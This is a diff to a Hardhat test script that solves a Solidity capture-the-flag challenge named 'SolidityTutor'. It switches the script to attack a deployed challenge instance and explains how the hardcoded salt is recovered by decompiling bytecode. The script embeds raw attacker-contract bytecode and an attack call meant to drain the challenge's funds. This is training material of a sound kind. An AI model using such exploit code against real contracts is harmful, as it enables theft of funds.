@@ -9,20 +9,20 @@ describe("SolidityTutor", function () {
     let challenge: Contract;
 
     // Set the challenge instance to the address returned when deploying the challenge.
-    let challenge_instance_address = "0x21c19A5453bC1285A3c5acecCA3fC49F9C30cE16";
+    let challenge_instance_address = "0xA3e7b2383EBfEAf93A609F611ae8C7cA0e4c7db2";
     before(async () => {
         [signer] = await ethers.getSigners();
         player = await signer.getAddress();
         console.log("Primary Signer Address:", player);
 
         // comment the next two lines if running locally 
-        //challengeFactory = await ethers.getContractFactory("SolidityTutor");
-        //challenge = challengeFactory.attach(challenge_instance_address);
+        challengeFactory = await ethers.getContractFactory("SolidityTutor");
+        challenge = challengeFactory.attach(challenge_instance_address);
 
         // uncomment if running locally:
-        challengeFactory = await ethers.getContractFactory("SolidityTutor");
-        challenge = await challengeFactory.deploy({ value: ethers.utils.parseEther("0.001")}) /**put your constructor args here*/;
-        await challenge.deployed();
+        // challengeFactory = await ethers.getContractFactory("SolidityTutor");
+        // challenge = await challengeFactory.deploy({ value: ethers.utils.parseEther("0.001")}) /**put your constructor args here*/;
+        // await challenge.deployed();
     });
 
     it("Should solve the challenge", async () => {
@@ -74,8 +74,10 @@ describe("SolidityTutor", function () {
             process.exit();
         }
 
-        const salt = 133742069; // This can be found by debugging the resetToInitialTutorial() transaction.
+        // This can be found by decompiling the code of the SolidityTutor contract. Because the salt is a constant state variable, the value is applied to all references at compile time, meaning that the value is basically hardcoded into the final bytecode.
+        const salt = 133742069;
 
+        // This bytecode was generated with solc. It can also be retrieved from Remix by compiling the contract and goingn to the compilation details menu.
         const attacker_bytecode = "0x608060405234801561001057600080fd5b506102e4806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806312065fe01461004657806353ce9e3914610064578063d018db3e14610082575b600080fd5b61004e6100b2565b60405161005b9190610153565b60405180910390f35b61006c6100ba565b6040516100799190610187565b60405180910390f35b61009c60048036038101906100979190610205565b6100c4565b6040516100a9919061024d565b60405180910390f35b600047905090565b6000610539905090565b6000808273ffffffffffffffffffffffffffffffffffffffff16476040516100eb90610299565b60006040518083038185875af1925050503d8060008114610128576040519150601f19603f3d011682016040523d82523d6000602084013e61012d565b606091505b5050905080915050919050565b6000819050919050565b61014d8161013a565b82525050565b60006020820190506101686000830184610144565b92915050565b6000819050919050565b6101818161016e565b82525050565b600060208201905061019c6000830184610178565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101d2826101a7565b9050919050565b6101e2816101c7565b81146101ed57600080fd5b50565b6000813590506101ff816101d9565b92915050565b60006020828403121561021b5761021a6101a2565b5b6000610229848285016101f0565b91505092915050565b60008115159050919050565b61024781610232565b82525050565b6000602082019050610262600083018461023e565b92915050565b600081905092915050565b50565b6000610283600083610268565b915061028e82610273565b600082019050919050565b60006102a482610276565b915081905091905056fea264697066735822122076936362e0adadf8d63a1b7169ebc4221551ab3b2aa2580b3faa2e87c462cf7364736f6c634300080f0033";
 
         try { 
@@ -94,6 +96,7 @@ describe("SolidityTutor", function () {
         const sanity = await attacker.sanity();
         console.log("Checking sanity() function to see if attacker contract deployed:", BigNumber.from(sanity).toString());
         try { 
+            // Add extra large gas fees to prevent unwanted behaviours.
             const attackTx = await helper.attack(player, challenge.address, { gasLimit: 1000000 });
             const attackReceipt = await attackTx.wait();
             console.log("Attack complete, now checking if solved...");
